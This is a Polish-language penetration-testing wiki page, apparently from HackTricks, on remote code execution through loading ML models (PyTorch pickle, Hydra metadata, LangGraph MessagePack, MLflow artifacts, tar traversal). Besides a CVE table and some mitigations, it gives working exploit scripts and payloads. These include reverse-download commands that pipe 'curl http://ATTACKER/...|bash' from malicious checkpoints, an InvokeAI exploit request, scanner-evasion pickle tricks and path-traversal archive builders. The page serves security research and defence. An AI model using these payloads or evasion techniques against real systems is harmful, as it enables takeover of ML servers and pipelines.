# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele uczenia maszynowego są zwykle udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Deweloperzy mogą ładować te modele na swoich maszynach lub w systemach produkcyjnych, aby z nich korzystać. Zwykle modele nie powinny zawierać złośliwego kodu, ale w niektórych przypadkach mogą służyć do wykonania dowolnego kodu w systemie — jako zamierzona funkcja lub z powodu podatności w bibliotece do ładowania modeli.

Poniższa tabela zawiera przykładowe podatności z tej kategorii:

| **Framework / narzędzie**        | **Podatność (CVE, jeśli dostępne)**                                                    | **Wektor RCE**                                                                                                                           | **Źródła**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                              | Złośliwy pickle w checkpointcie modelu prowadzi do wykonania kodu (z pominięciem zabezpieczenia `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + pobranie złośliwego modelu powodują wykonanie kodu; RCE przez deserializację Javy w API zarządzania                                        | |
| **NVIDIA Merlin Transformers4Rec** | Niebezpieczna deserializacja checkpointu przez `torch.load` **(CVE-2025-23298)**                                           | Niezaufany checkpoint uruchamia reducer pickle podczas `load_model_trainer_states_from_checkpoint` → wykonanie kodu w workerze ML            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (checkpointery SQLite/Redis) | SQLi + niebezpieczny hook rozszerzeń MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kontrolowany przez użytkownika klucz `filter` wstrzykuje składnię SQL/JSON-path, `UNION SELECT` tworzy fałszywy wiersz checkpointu, a następnie deserializacja `msgpack` importuje i wywołuje wybrany przez atakującego kod Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsowanie TFLite)                                                                                          | Przygotowany model `.tflite` wywołuje przepełnienie liczby całkowitej → uszkodzenie sterty (potencjalne RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Załadowanie modelu przez `joblib.load` wykonuje pickle z ładunkiem `__reduce__` atakującego                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *sporna*                                                                              | Domyślne ustawienia `numpy.load` dopuszczały tablice obiektów pickle — złośliwy plik `.npy/.npz` wywołuje wykonanie kodu                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (directory traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Ścieżka do wag zewnętrznych modelu ONNX może wyjść poza katalog (odczyt dowolnych plików) <br> Złośliwe archiwum tar z modelem ONNX może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (ryzyko projektowe)  | *(Brak CVE)* Niestandardowe operatory ONNX / przepływ sterowania                                                                                    | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu nadużywają logiki, by wykonywać niezamierzone obliczenia   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Użycie API ładowania modeli przy włączonej opcji `--model-control` umożliwia przejście do katalogu nadrzędnego ścieżką względną i zapis plików (np. nadpisanie `.bashrc` w celu RCE)    | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                         | Nieprawidłowy plik modelu GGUF powoduje przepełnienie bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu w systemie ofiary                     | |
| **Keras (starsze formaty)**   | *(Brak nowych CVE)* Starszy model Keras H5                                                                                         | Złośliwy model HDF5 (`.h5`) z warstwą Lambda nadal wykonuje kod podczas ładowania (Keras `safe_mode` nie obejmuje starszego formatu — „downgrade attack”) | |
| **Inne** (ogólnie)        | *Błąd projektowy* – serializacja Pickle                                                                                         | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modelu, jeśli nie zostaną zastosowane zabezpieczenia | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Niezaufane metadane przekazywane do `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Kontrolowane przez atakującego metadane/konfiguracja modelu ustawiają `_target_` na dowolną funkcję (np. `builtins.exec`) → kod zostaje wykonany podczas ładowania, nawet przy użyciu „bezpiecznych” formatów (`.safetensors`, `.nemo`, repozytoryjne `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ponadto istnieją modele oparte na Python pickle, takie jak modele używane przez [PyTorch](https://github.com/pytorch/pytorch/security), których można użyć do wykonania dowolnego kodu w systemie, jeśli nie zostaną załadowane z `weights_only=True`. Każdy model oparty na pickle może więc być szczególnie podatny na tego typu ataki, nawet jeśli nie został wymieniony w powyższej tabeli.

### Omijanie statycznych kontroli checkpointów opartych na pickle

Ścieżka ładowania modelu, która wywołuje nieograniczone `pickle.load()`, `joblib.load()` lub `torch.load(..., weights_only=False)`, jest miejscem wykonania kodu, a nie tylko parserem.<sup>[[22]](#references)</sup> W PyTorch 2.6 `torch.load()` domyślnie ustawia `weights_only=True`, jeśli nie podano niestandardowego modułu pickle; poniższe przykłady wymagają nieograniczonego loadera albo aplikacji, która wyłącza tę ochronę, aby załadować nieobsługiwany obiekt.<sup>[[4]](#references)</sup> Czysty wynik skanowania statycznego nie zmienia tej granicy.<sup>[[21]](#references)</sup>

Zobacz [deserializację Python pickle](../pentesting-web/deserialization/#pickle), aby poznać podstawowy prymityw `__reduce__`, oraz [listę dozwolonych importów ML w Fickling](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling), aby zapoznać się z kontrolami importów w czasie działania.

#### Zarejestruj funkcję, a następnie rozwiąż ją za pomocą `EXT2`

Pickle może wywołać `copyreg.add_extension` przez `REDUCE`, rejestrując parę moduł/nazwa pod wybranym przez atakującego numerycznym kodem rozszerzenia. Późniejszy `EXT2` rozwiązuje ten kod do funkcji, którą może wywołać kolejne `REDUCE`. Kluczowa funkcja nie jest więc operandem opcode `GLOBAL` ani `STACK_GLOBAL`. Binarly zademonstrowało to przy użyciu `multiprocessing.util.spawnv_passfds`; cztery z pięciu ocenianych skanerów nie wykryły ataku, podczas gdy SaferPickle go wykrył. Zmiana rejestru i rozwiązanie `EXT2` zachodzą w ramach tej samej operacji unpicklingu.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

To szkic opcode'ów, a nie kompletny checkpoint: zewnętrzny loader musi akceptować otaczający go strumień pickle. Skaner, który wyszukuje niebezpieczne funkcje wyłącznie w operandach `GLOBAL`, nie wykryje późniejszego wyszukania; skaner bez obsługi `EXT2` może zakończyć działanie przed wydaniem werdyktu. Ścisła allowlista może nadal odrzucić samo `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Ukrywanie skonstruowanych typów obiektów kodu za zwykłymi funkcjami

Inny łańcuch pickle może uzyskać `FunctionType` przez `type(copy.copy)` i `CodeType` przez `type(copy.copy.__code__)`, a następnie skonstruować obiekt kodu z podanych bajtów kodu, opakować go jako funkcję i wywołać. Opublikowany wariant uzyskuje `__code__` za pomocą `operator.methodcaller('__getattribute__', '__code__')`, więc pickle nie musi importować żadnego z tych konstruktorów po nazwie. Układ pól `CodeType(...)` i bajty kodu zależą od wersji CPython; payload przygotowany dla innego interpretera może zakończyć działanie przed wykonaniem. SaferPickle nadal oznaczył przedstawioną próbkę, ale obniżył jej ocenę do `suspicious`; pozostałe cztery oceniane skanery jej nie wykryły.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Wywołaj ładowanie drugiego modelu za pomocą argumentu pickle

Zewnętrzny pickle może wywołać `torch.storage._load_from_bytes`, przekazując mu jako argument serializowany model dostarczony przez atakującego. Ta funkcja wywołuje `torch.load(io.BytesIO(b), weights_only=False)`, więc zagnieżdżony model jest deserializowany bez ograniczenia `weights_only`, mimo że skaner opcode’ów analizujący najwyższy poziom widzi tylko bajty przekazane do jednej funkcji. Zewnętrzne ładowanie nadal musi zezwalać na tę funkcję; `weights_only=True` nie sprawia automatycznie, że zewnętrzny pickle ją akceptuje. Skanery, które nie analizują rekurencyjnie zagnieżdżonych bajtów, mogą przeoczyć wewnętrzny łańcuch `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Rozwiąż nazwę modułu starszego pickle podczas ładowania

Dla protokołów pickle niższych niż 3 domyślne ustawienie `fix_imports=True` w Pythonie mapuje odwołanie `GLOBAL` do `commands.run` na `subprocess.run` za pośrednictwem `_compat_pickle.IMPORT_MAPPING`. Skaner porównujący dosłowny ciąg nazwy modułu z listą blokowanych modułów `subprocess` może więc przeoczyć funkcję wywoływaną w czasie działania. Wymaga to loadera, który zachowuje mapowanie zgodności i akceptuje wynikowe argumenty wywołania.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Przekieruj checkpoint niebędący ZIP-em poza skaner przeznaczony tylko dla ZIP

Wybór formatu może zawieść niezależnie od inspekcji opcode’ów: Binarly ustaliło, że ModelScan 0.8.8 kierował pliki `.bin`, `.pt`, `.pth` i `.ckpt` do skanera PyTorch przeznaczonego dla ZIP i pomijał strumień pickle niebędący ZIP-em, zamiast przekazać go do skanera zwykłego pickle. Opisano też starszy układ modelu TAR, który akceptuje `torch.load()`, ale którego nie sprawdzały ModelScan ani JFrog. Są to luki specyficzne dla wersji skanerów, a nie cechy każdego skanera modeli.<sup>[[21]](#references)</sup>

#### Wykonaj kod, zanim parser statyczny dotrze do niepoprawnego zakończenia

Skaner, który w całości przetwarza pickle za pomocą `pickletools.genops()`, może zgłosić błąd przy uciętym opcode występującym po poprawnym `REDUCE`. Unrestricted unpickler wywołał już funkcję, zanim napotkał to zakończenie, nawet jeśli później całe ładowanie zakończy się błędem. W zgłoszonym przykładzie bezpośrednio po wykonującym się `REDUCE` umieszczono ucięty `BINUNICODE`, przez co `pickletools.genops()` zgłosił błąd, mimo że wcześniej doszło do efektu ubocznego w postaci zapisu pliku. Pozwala to ominąć skaner tylko wtedy, gdy uznaje on błąd parsowania za brak zagrożenia albo pomija plik. Jest to przydatne tylko wtedy, gdy efekt uboczny ma znaczenie bez pomyślnego zwrócenia modelu; cel wymagający ukończonego ładowania może odrzucić artefakt.<sup>[[21]](#references)</sup>

### Metadane Hydra → RCE (działa nawet z safetensors)

`hydra.utils.instantiate()` importuje i wywołuje dowolny obiekt `_target_` o zapisie kropkowym w obiekcie konfiguracji/metadanych. Gdy biblioteki takie jak Hugging Face Transformers przekazują **niezaufane metadane modelu** do `instantiate()`, atakujący może podać funkcję i argumenty, które zostaną natychmiast wykonane podczas ładowania modelu (bez pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Przykład payloadu (działa w `model_config.yaml` w `.nemo`, `config.json` w repo albo w `__metadata__` wewnątrz `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Najważniejsze punkty:
- Wykonanie następuje przed inicjalizacją modelu w `restore_from/from_pretrained` w NeMo, koderach HuggingFace uni2TS i loaderach FlexTok.
- Stringowa lista blokad Hydra daje się ominąć za pomocą alternatywnych ścieżek importu (np. `enum.bltns.eval`) lub nazw rozwiązywanych przez aplikację (np. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok parsuje również metadane w postaci ciągu znaków za pomocą `ast.literal_eval`, co umożliwia DoS (nadmierne zużycie CPU/pamięci) przed wywołaniem Hydra.

### 🆕  RCE w InvokeAI przez `torch.load` (CVE-2024-12029)

`InvokeAI` to popularny, otwartoźródłowy interfejs webowy dla Stable-Diffusion. Wersje **5.3.1 – 5.4.2** udostępniają endpoint REST `/api/v2/models/install`, który umożliwia użytkownikom pobieranie i ładowanie modeli z dowolnych adresów URL.<sup>[[1]](#references)</sup>

Wewnętrznie endpoint ostatecznie wywołuje:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Gdy dostarczony plik jest **checkpointem PyTorch (`*.ckpt`)**, `torch.load` wykonuje **deserializację pickle**. Ponieważ zawartość pochodzi bezpośrednio z kontrolowanego przez użytkownika URL-a, atakujący może umieścić w checkpoincie złośliwy obiekt z własną metodą `__reduce__`; metoda ta jest wykonywana **podczas deserializacji**, co prowadzi do **remote code execution (RCE)** na serwerze InvokeAI.

Podatności przypisano identyfikator **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Przebieg exploita

1. Utwórz złośliwy checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Umieść `payload.ckpt` na kontrolowanym przez siebie serwerze HTTP (np. `http://ATTACKER/payload.ckpt`).
3. Wywołaj podatny endpoint (uwierzytelnianie nie jest wymagane):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Gdy InvokeAI pobiera plik, wywołuje `torch.load()` → uruchamia się gadget `os.system`, a atakujący uzyskuje możliwość wykonywania kodu w kontekście procesu InvokeAI.

Gotowy exploit: moduł **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatyzuje cały proces.<sup>[[3]](#references)</sup>

#### Warunki

•  InvokeAI 5.3.1-5.4.2 (domyślna wartość flagi scan to **false**)
•  Endpoint `/api/v2/models/install` jest dostępny dla atakującego
•  Proces ma uprawnienia do wykonywania poleceń powłoki

#### Środki zaradcze

* Zaktualizuj do **InvokeAI ≥ 5.4.3** – poprawka domyślnie ustawia `scan=True` i skanuje pliki pod kątem malware przed deserializacją.<sup>[[2]](#references)</sup>
* Podczas programowego wczytywania checkpointów używaj `torch.load(file, weights_only=True)` lub nowego helpera [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Wymuszaj stosowanie list dozwolonych / podpisów dla źródeł modeli i uruchamiaj usługę z minimalnymi uprawnieniami.

> ⚠️ Pamiętaj, że każdy format oparty na Python pickle (w tym wiele plików `.pt`, `.pkl`, `.ckpt`, `.pth`) jest z natury niebezpieczny do deserializacji z niezaufanych źródeł.

---

Przykład doraźnego środka zaradczego, jeśli musisz nadal uruchamiać starsze wersje InvokeAI za reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Transformers4Rec RCE przez niebezpieczne `torch.load` (CVE-2025-23298)

Transformers4Rec od NVIDIA (część Merlin) udostępniał niebezpieczny loader checkpointów, który bezpośrednio wywoływał `torch.load()` dla ścieżek podanych przez użytkownika. Ponieważ `torch.load` korzysta z Python `pickle`, checkpoint kontrolowany przez atakującego może wykonywać dowolny kod za pośrednictwem reducera podczas deserializacji.<sup>[[5]](#references)</sup>

Podatna ścieżka (przed poprawką): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Dlaczego prowadzi to do RCE: W Python `pickle` obiekt może definiować reducer (`__reduce__`/`__setstate__`), który zwraca funkcję i argumenty. Funkcja ta jest wykonywana podczas odczytywania obiektu z pickle. Jeśli taki obiekt znajduje się w checkpoincie, jego kod uruchamia się, zanim zostaną użyte jakiekolwiek wagi.

Minimalny przykład złośliwego checkpointu:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Wektory dostarczenia i zasięg rażenia:
- Zainfekowane checkpointy/modele udostępniane przez repozytoria, buckety lub rejestry artefaktów
- Zautomatyzowane pipeline’y wznawiania/wdrażania, które automatycznie wczytują checkpointy
- Kod jest wykonywany wewnątrz workerów treningowych/wnioskowania, często z podwyższonymi uprawnieniami (np. jako root w kontenerach)

Poprawka: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) zastąpił bezpośrednie wywołanie `torch.load()` ograniczonym deserializatorem z listą dozwolonych elementów, zaimplementowanym w `transformers4rec/utils/serialization.py`. Nowy loader weryfikuje typy/pola i zapobiega wywoływaniu dowolnych funkcji podczas wczytywania.<sup>[[7]](#references)</sup>

Wskazówki dotyczące zabezpieczania checkpointów PyTorch:
- Nie używaj unpickle na niezaufanych danych. W miarę możliwości wybieraj formaty niewykonujące kodu, takie jak [Safetensors](https://huggingface.co/docs/safetensors/index) lub ONNX.
- Jeśli musisz użyć serializacji PyTorch, ustaw `weights_only=True` (obsługiwane w nowszych wersjach PyTorch) albo użyj własnego unpicklera z listą dozwolonych elementów, podobnego do poprawki Transformers4Rec.<sup>[[4]](#references)</sup>
- Weryfikuj pochodzenie/podpisy modeli i uruchamiaj deserializację w sandboxie (seccomp/AppArmor; użytkownik inny niż root; ograniczony system plików i brak dostępu wychodzącego do sieci).
- Monitoruj nieoczekiwane procesy potomne uruchamiane przez usługi ML podczas wczytywania checkpointów; śledź użycie `torch.load()`/`pickle`.

POC oraz odniesienia do podatnej i poprawionej wersji:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Podatny loader sprzed poprawki: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC złośliwego checkpointu: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader po poprawce: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Przykład – tworzenie złośliwego modelu PyTorch

- Utwórz model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Załaduj model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserializacja Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD udostępnia endpoint `resnet`, który deserializuje dane kontrolowane przez użytkownika. ZDI potwierdziło, że zdalny atakujący może nakłonić ofiarę do załadowania złośliwej strony/pliku, spowodować przesłanie przez nią spreparowanego serializowanego obiektu do tego endpointu i wywołać deserializację z uprawnieniami `root`, co prowadzi do pełnego przejęcia systemu.

Przebieg exploita przypomina typowe nadużycie pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Każdy gadget osiągalny podczas deserializacji (konstruktory, `__setstate__`, callbacki frameworka itp.) można wykorzystać w ten sam sposób — niezależnie od tego, czy transportem było HTTP, WebSocket czy plik umieszczony w monitorowanym katalogu.



### LangGraph checkpointer SQLi → MessagePack RCE

Ten łańcuch ataku jest interesujący, ponieważ atakujący **nie musi przesyłać złośliwego pliku modelu**. Zamiast tego aplikacja udostępnia **API trwałego przechowywania danych agenta AI** (`get_state_history(..., filter=...)`), a dane wejściowe użytkownika trafiają do konstruktora zapytań checkpointera.

#### 1. Strukturalne SQLi w filtrach metadanych

Podatny wzorzec SQLite wyglądał tak:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Wartość jest wiązana później, ale `query_key` jest konkatenowany do **ciągu ścieżki JSON**, więc znak `'` wewnątrz klucza słownika pozwala wyjść z `'$.{query_key}'` i wstrzyknąć SQL. Ta sama zasada dotyczy **ścieżek JSON, identyfikatorów, operatorów, `LIMIT` i pól TTL**: placeholdery chronią tylko wartości, a nie składnię strukturalną zapytania.

#### 2. `UNION SELECT` może kierować do dalszych sinków, a nie służyć tylko kradzieży danych

Zapytanie zwraca `type` oraz zserializowane bajty `checkpoint`, które są później wykorzystywane jako:

```python
self.serde.loads_typed((type, checkpoint))
```

Oznacza to, że SQLi w klauzuli `WHERE` może wstrzyknąć **fałszywy wiersz wyniku**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Jeśli późniejszy kod parsuje, deserializuje, zapisuje lub wykonuje dowolną wybraną kolumnę, przypisz te kolumny do ich sinków. W tym przypadku fałszywy wiersz zamienia SQLi w **deserializację kontrolowaną przez atakującego**.

#### 3. Niebezpieczne hooki rozszerzeń MessagePack są równoważne gadgetom kodu

Ścieżka `msgpack` w LangGraph używała niestandardowego hooka rozszerzeń, który rozpakowywał zagnieżdżoną krotkę i wykonywał:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Zatem obiekt rozszerzenia MessagePack kodujący coś równoważnego z `("os", "system", "id > /tmp/pwned")` importuje `os`, rozwiązuje `system` i uruchamia polecenie. Podczas przeglądu frameworków AI sprawdzaj **niestandardowe revivery MessagePack/JSON/pickle** pod kątem dynamicznych importów, reflection lub dowolnego dispatchu callable.

#### 4. Praktyczny wzorzec audytu frameworków agentów

Sprawdź wszelkie dane wejściowe kontrolowane przez użytkownika, które trafiają do:
- API listujące historię stanu / pamięć / odtwarzanie / checkpointy
- builderów ustrukturyzowanych filtrów generujących fragmenty zapytań SQL lub Redis
- niestandardowych deserializatorów (`pickle`, `msgpack`, hooki obiektów `json`, konstruktory YAML)
- ścieżek odzyskiwania, które ufają wierszom zwracanym przez warstwę persistence

Ten konkretny łańcuch dotyczył wdrożeń LangGraph hostowanych samodzielnie, korzystających z checkpointerów **SQLite** lub **Redis**, gdy niezaufani użytkownicy mogli kontrolować `filter`. W ujawnieniu wskazano następujące poprawione wersje: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` oraz `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Nadpisanie artefaktu MLflow PyFunc prowadzące do pickle RCE

MLflow PyFunc utworzony na podstawie `PythonModel` może przechowywać serializowany obiekt jako `python_model.pkl`. Metadane modelu wskazują `mlflow.pyfunc.model` jako jego loader, a implementacja MLflow używa tej nazwy pliku dla zapisanego modelu Python. W rezultacie uprawnienia do zapisu w artifact store mogą umożliwić wykonanie kodu w innej aplikacji, która później załaduje model.<sup>[[17]](#references)[[18]](#references)</sup>

Przydatny łańcuch ataku to **uprawnienia do zapisu artefaktów → podmiana pickle → wymuszenie ponownego załadowania go przez konsumenta inference**. W przypadku eksperymentu korzystającego z proxied `mlflow-artifacts:/...` root wylicz ścieżkę do artefaktu eksperymentu, run i modelu. Serwer śledzenia udostępnia `GET` i `PUT` pod adresem `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimalny reducer może wykonać polecenie, gdy tylko odbiorca odpickle’uje artefakt. Wygenerowanie payloadu przy użyciu wersji Pythona zadeklarowanej w `MLmodel` pozwala uniknąć problemów ze zgodnością.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Uruchom operację, która **ładuje istniejący model**, na przykład predykcję, scoring lub wdrożenie. Nie trenuj modelu ponownie, ponieważ trening może zastąpić złośliwy artefakt nowym modelem. Błąd aplikacji nie oznacza, że exploitacja się nie powiodła: reducer zwraca całkowity kod wyjścia polecenia zamiast użytecznego modelu. Zacznij od obserwowalnego efektu ubocznego, takiego jak ICMP lub callback HTTP, a następnie zastąp go końcowym payloadem.<sup>[[20]](#references)</sup>

Podczas oceny rozróżniaj uprawnienia do utworzenia runu od uprawnień do nadpisywania artefaktów należących do innego runu. Sprawdź uwierzytelnianie i uprawnienia do aktualizacji poszczególnych runów, skontroluj nieoczekiwane modyfikacje pliku `python_model.pkl` oraz uwzględnij pochodzenie i integralność modelu jako część granicy wykonania. Aktualny kod MLflow obsługuje również ustawienie `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` i zaleca używanie artefaktów models-from-code zamiast ładowania danych cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Udostępnione serwery modeli i infrastruktura ML

Załadowanie złośliwego modelu to nie jedyny sposób na wykonanie kodu w infrastrukturze ML. Interfejsy API do przesyłania zadań, punkty końcowe do walidacji kodu i pobieranie modeli z rejestru w samodzielnie hostowanych usługach AI mogą prowadzić do wykonania kodu bez użycia pliku modelu. Zobacz [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Modele do Path Traversal

Jak opisano w [**tym wpisie na blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), większość formatów modeli używanych przez różne frameworki AI bazuje na archiwach, zwykle `.zip`. Możliwe więc, że da się wykorzystać te formaty do przeprowadzenia ataków path traversal i odczytania dowolnych plików z systemu, w którym ładowany jest model.<sup>[[16]](#references)</sup>

Na przykład poniższy kod pozwala utworzyć model, który po załadowaniu utworzy plik w katalogu `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Lub za pomocą poniższego kodu można utworzyć model, który po załadowaniu utworzy dowiązanie symboliczne do katalogu `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Dogłębna analiza: deserializacja Keras .keras i wyszukiwanie gadgetów

Szczegółowy przewodnik po wewnętrznych mechanizmach .keras, RCE w warstwie Lambda, problemie dowolnego importu w wersjach ≤ 3.8 oraz wyszukiwaniu gadgetów po poprawce w obrębie allowlisty znajdziesz tutaj:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog OffSec – „CVE-2024-12029 – deserializacja niezaufanych danych w InvokeAI”](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit poprawki InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentacja modułu Metasploit w Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – kwestie bezpieczeństwa związane z torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog ZDI – CVE-2025-23298: uzyskiwanie zdalnego wykonania kodu w NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Advisory ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit poprawki Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Podatny loader sprzed poprawki (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
